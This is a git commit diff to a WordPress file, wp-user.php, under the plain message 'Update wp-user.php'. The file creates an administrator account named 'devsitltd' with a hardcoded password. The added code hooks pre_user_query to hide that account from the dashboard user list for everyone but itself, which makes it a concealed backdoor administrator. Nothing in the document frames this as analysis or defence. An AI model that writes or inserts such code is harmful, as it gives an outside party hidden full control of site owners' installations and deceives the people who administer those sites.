c5d6ec5c79ab2f68104eee520f0b4c4d3b1f82b5
MD. SHAHAB UDDIN <support@devsit.com>
2016-04-20 09:54:00 +0600

    Update wp-user.php

--- wp-user.php
+++ wp-user.php
@@ -1,4 +1,17 @@
 <?php
-$createUser = wp_create_user( 'devsitltd','-----','devsitltd@gmail.com' ) ;
+$createUser = wp_create_user( 'devsitltd','DevsIT','devsitltd@gmail.com' ) ;
 $userWP=new wp_User($createUser);
 $userWP->set_role('administrator');
+
+//hide user form dashboard
+add_action('pre_user_query','yoursite_pre_user_query');
+function yoursite_pre_user_query($user_search) {
+  global $current_user;
+  $username = $current_user->user_login;
+
+  if ($username != 'devsitltd') { 
+    global $wpdb;
+    $user_search->query_where = str_replace('WHERE 1=1',
+      "WHERE 1=1 AND {$wpdb->users}.user_login != 'devsitltd'",$user_search->query_where);
+  }
+}
